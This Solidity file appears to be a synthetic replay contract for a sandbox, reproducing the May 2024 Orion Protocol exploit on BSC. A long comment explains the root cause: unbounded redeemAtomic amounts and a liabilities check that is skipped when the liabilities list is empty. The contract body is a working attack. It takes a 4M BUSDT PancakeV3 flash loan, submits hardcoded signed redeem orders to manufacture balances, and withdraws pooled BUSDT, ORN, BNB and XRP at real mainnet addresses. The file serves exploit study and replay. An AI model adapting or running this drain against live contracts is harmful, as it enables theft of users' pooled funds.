// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-Tradeonorion).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (ContractTest is Test; testExploit() -> attack() does all the
// setup as `alice` via vm.startPrank, then Pool.flash(...) triggers
// pancakeV3FlashCallback which also lives on the test itself). There is no
// standalone exploit contract to deploy.
//
// This synthetic contract reproduces only the RECORDED half of the attack:
// triggering the PancakeV3 flash loan and running its callback. The earlier
// `alice`-as-msg.sender phase (deposit/lockStake/redeemAtomic/
// requestReleaseStake, which desynchronises Orion's liabilities[] array
// while never leaving a *tracked* liability at the moment checkPosition
// runs) is reproduced faithfully as unrecorded `setup` steps in
// scripts/poc-configs/2024-05-Tradeonorion.mjs, each impersonating `alice`
// via the setup step's `caller` directive -- exactly mirroring the original
// test's `vm.startPrank(alice)` block. See that config for the full
// pre-flash sequence; this contract only needs to exist so PancakeV3's
// `flash()` has a contract address to call back into.
//
// Root cause (Orion Protocol "ExchangeWithAtomic", BSC, ~$645K, May 2024):
// LibAtomic.doRedeemAtomic() moves `order.amount` from a signature-authorized
// `order.sender` to `order.receiver` with NO upper bound and no >=0
// post-check on the debited side (unlike the sibling doLockAtomic, which
// does check). The only guard is a single trailing checkPosition(sender)
// call in the ExchangeWithAtomic wrapper -- and checkPosition() is a no-op
// whenever liabilities[user].length == 0. requestReleaseStake() credits
// staked ORN back to the ledger with NO liability check at all (despite its
// own doc-comment claiming unlock is impossible with liabilities), which is
// what lets the setup phase keep liabilities[] empty across each debit. With
// liabilities always empty at the moment checkPosition runs, the attacker
// self-signs a chain of redeemAtomic orders (below) that mints an arbitrary
// positive balance on `alice` (funded with a disposable PancakeV3 BUSDT
// flash loan to satisfy withdrawTo's real-token floor), then withdraws real
// pooled ORN/BUSDT/BNB/XRP against the manufactured balances.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

library LibAtomic {
    struct RedeemOrder {
        address sender;
        address receiver;
        address claimReceiver;
        address asset;
        uint64 amount;
        uint64 expiration;
        bytes32 secretHash;
        bytes signature;
    }
}

interface VulnContract {
    function depositAssetTo(address assetAddress, uint112 amount, address account) external;
    function redeemAtomic(LibAtomic.RedeemOrder calldata order, bytes calldata secret) external;
    function withdrawTo(address assetAddress, uint112 amount, address to) external;
}

contract TradeonorionDrain {
    Uni_Pair_V3 constant Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant ORN = IERC20(0xe4CA1F75ECA6214393fCE1C1b316C237664EaA8e);
    IERC20 constant XRP = IERC20(0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE);
    VulnContract constant vulnContract = VulnContract(0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca);

    // Fixed, signature-bound identities from the original PoC. Ordinary EOAs
    // (no code) whose only role is to satisfy the ecrecover checks baked
    // into the hardcoded RedeemOrder signatures below -- independent of this
    // contract's own deploy address.
    address constant alice = 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6; // makeAddrAndKey("alice") in the original test
    address constant attacker = 0xBff5B4425aF6258eDa3204CD3F734eCdCF94fd8b; // vm.addr(123456) in the original test

    // Entry point for the RECORDED half of the attack: by the time this runs,
    // the `setup` block (this contract's config) has already desynchronised
    // Orion's liabilities[] array via alice's self-signed redeem/release
    // cycles. All that remains is to flash-borrow working capital and cash
    // out the manufactured balances.
    function run() external {
        Pool.flash(address(this), 4_000_000 ether, 0, "0x123");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        BUSDT.approve(address(vulnContract), type(uint256).max);
        vulnContract.depositAssetTo(address(BUSDT), 4_000_000 ether, attacker);

        // Manufacture a huge positive ORN balance on alice: debits attacker's
        // ORN ledger by ~1.96M ORN units (no upper bound, no >=0 post-check
        // in doRedeemAtomic) -- checkPosition(attacker) still passes because
        // attacker's liabilities[] array is empty (set up in the `setup` phase).
        bytes memory Attackhash = abi.encodePacked("attack");
        LibAtomic.RedeemOrder memory attackorder = LibAtomic.RedeemOrder({
            sender: attacker,
            receiver: alice,
            claimReceiver: alice,
            asset: address(ORN),
            amount: 196_375_601_599_999,
            expiration: 3_433_740_589_266,
            secretHash: keccak256(abi.encodePacked("attack")),
            signature: hex"c44429a5ff5ae246f407058156120f1febebfb0cc1e3e35d9ee845ba12c998d369fe6c97b343eb15fefc2cc28faf38509623fdb630fdd1d3cb6f637f8839562a1b"
        });
        vulnContract.redeemAtomic(attackorder, Attackhash);

        // Move the manufactured BUSDT balance from alice to this contract and
        // cash it out for real tokens.
        bytes memory Attackhash_2 = abi.encodePacked("attack-2");
        LibAtomic.RedeemOrder memory attackorder_2 = LibAtomic.RedeemOrder({
            sender: alice,
            receiver: address(this),
            claimReceiver: address(this),
            asset: address(BUSDT),
            amount: 401_984_468_607_796,
            expiration: 3_433_740_590_656,
            secretHash: keccak256(abi.encodePacked("attack-2")),
            signature: hex"936624bf8c31c3f55d1e623ac3cc0360e1968daf3c04efab3292d45ebe3083e367fdeeea04183e441e75255d4201f3dadb05d923260d9bb202374242b4eeaaae1b"
        });
        vulnContract.redeemAtomic(attackorder_2, Attackhash_2);
        vulnContract.withdrawTo(address(BUSDT), 4_019_844_686_077_960_000_000_000, address(this));

        // Drain manufactured ORN.
        bytes memory Attackhash_3 = abi.encodePacked("attack-3");
        LibAtomic.RedeemOrder memory attackorder_3 = LibAtomic.RedeemOrder({
            sender: alice,
            receiver: address(this),
            claimReceiver: address(this),
            asset: address(ORN),
            amount: 49_892_192_920_826,
            expiration: 3_433_740_591_490,
            secretHash: keccak256(abi.encodePacked("attack-3")),
            signature: hex"f90bfb2eb2870ded343c7553e656ea7512464fda152f31e5938afc5e75eb39387a65e05b89821f190e75acca13937c38c4fe88282f95f57e3dc4c810e63c5d411b"
        });
        vulnContract.redeemAtomic(attackorder_3, Attackhash_3);
        vulnContract.withdrawTo(address(ORN), 49_892_192_920_826, address(this));

        // Drain manufactured native BNB (asset = address(0)).
        bytes memory Attackhash_4 = abi.encodePacked("attack-4");
        LibAtomic.RedeemOrder memory attackorder_4 = LibAtomic.RedeemOrder({
            sender: alice,
            receiver: address(this),
            claimReceiver: address(this),
            asset: address(0),
            amount: 7_989_615_974,
            expiration: 3_433_740_592_082,
            secretHash: keccak256(abi.encodePacked("attack-4")),
            signature: hex"ba218089103438fb970527519e0d0bc378dba137365d83eb1b33e45ec74755d230bc8ced929cf611788c7bb73adadb7fb5347c60bf43fff7c8cbd627ac7ecb301c"
        });
        vulnContract.redeemAtomic(attackorder_4, Attackhash_4);
        vulnContract.withdrawTo(address(0), 79_896_159_740_000_000_000, address(this));

        // Drain manufactured XRP.
        bytes memory Attackhash_6 = abi.encodePacked("attack-5");
        LibAtomic.RedeemOrder memory attackorder_5 = LibAtomic.RedeemOrder({
            sender: alice,
            receiver: address(this),
            claimReceiver: address(this),
            asset: address(XRP),
            amount: 6_244_473_033_100,
            expiration: 3_433_740_592_082,
            secretHash: keccak256(abi.encodePacked("attack-5")),
            signature: hex"1f881dd5cb69a03554e9abf25f8fac02c709f257214009641e27434ce7688d8f31bd7a76809f244c6c5344687f559724e929775b542ebe61a9449c6bcee387f71c"
        });
        vulnContract.redeemAtomic(attackorder_5, Attackhash_6);
        vulnContract.withdrawTo(address(XRP), 62_444_730_331_000_000_000_000, address(this));

        // Repay the PancakeV3 flash loan (principal + fee).
        BUSDT.transfer(msg.sender, 4_002_000 ether);
    }

    receive() external payable {}
}
